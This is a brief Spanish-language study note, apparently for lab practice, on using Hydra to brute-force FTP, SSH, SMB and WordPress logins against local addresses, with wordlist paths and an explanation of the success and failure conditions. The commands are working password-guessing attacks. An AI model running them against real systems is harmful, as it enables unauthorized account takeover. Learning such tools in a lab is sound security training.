# hydra

```
hydra -l usuario -p password ftp://127.0.0.1 -t 15
```

con distincion entre mayusuculas y minusculas en el caso de emplear uno o varios L diccionario de usuarios y P diccionario de contraseñas

```
hydra -l usuario -P passwords ssh://127.0.0.1 -s 22
```

```
hydra -l james -P passwords.txt <ip> smb
```

!\[\[Pasted image 20251018214212.png]]

```
hydra -l mario -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 172.17.0.2 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
```

log y pwd son los campos que estan en el formulario de la pagina web podemos verlos si hacemos control u o con burpsuite

tambien esta haciendo S=302 porque en este caso si hace un login fallido redirige a la misma web y no esta mostrando ningun mensaje de error

en caso de que nos de un mensaje de error pondriamos F= y el mensje de error correspondiente

los diccionarios que suelen utilizar es para usuarios:

```
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```

```
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
